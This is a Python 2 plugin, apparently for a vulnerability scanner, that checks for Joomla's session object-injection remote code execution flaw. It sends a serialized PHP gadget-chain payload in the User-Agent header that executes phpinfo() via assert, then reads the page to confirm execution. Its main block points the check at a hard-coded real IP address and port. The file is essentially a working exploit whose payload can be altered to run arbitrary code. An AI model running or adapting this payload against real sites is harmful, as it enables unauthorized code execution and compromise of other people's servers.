#!/usr/bin/env python
# encoding: utf-8
from t import T
import urllib2
import cookielib


import pexpect

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):

        result = {}
        result['result']=False
        target_url = "http://"+ip+":"+port

        i=0
        req=None
        try:

            cj = cookielib.CookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            urllib2.install_opener(opener)
            urllib2.socket.setdefaulttimeout(10)

            ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'

            req = urllib2.Request(url=target_url, headers={'User-Agent': ua})
            opener.open(req)
            req = urllib2.Request(url=target_url)
            if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read():


                result['result'] = True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type'] = 'joomla unrec'
                result['VerifyInfo']['URL'] = ip + ':' + port
                result['VerifyInfo']['payload'] = ua
                result['VerifyInfo']['level'] = 'hole'


        except Exception,e:
            pass

        finally:
            if req is not None:
                del req
            return result
if __name__ == '__main__':
    print P().verify(ip='119.90.40.147',port='8081')
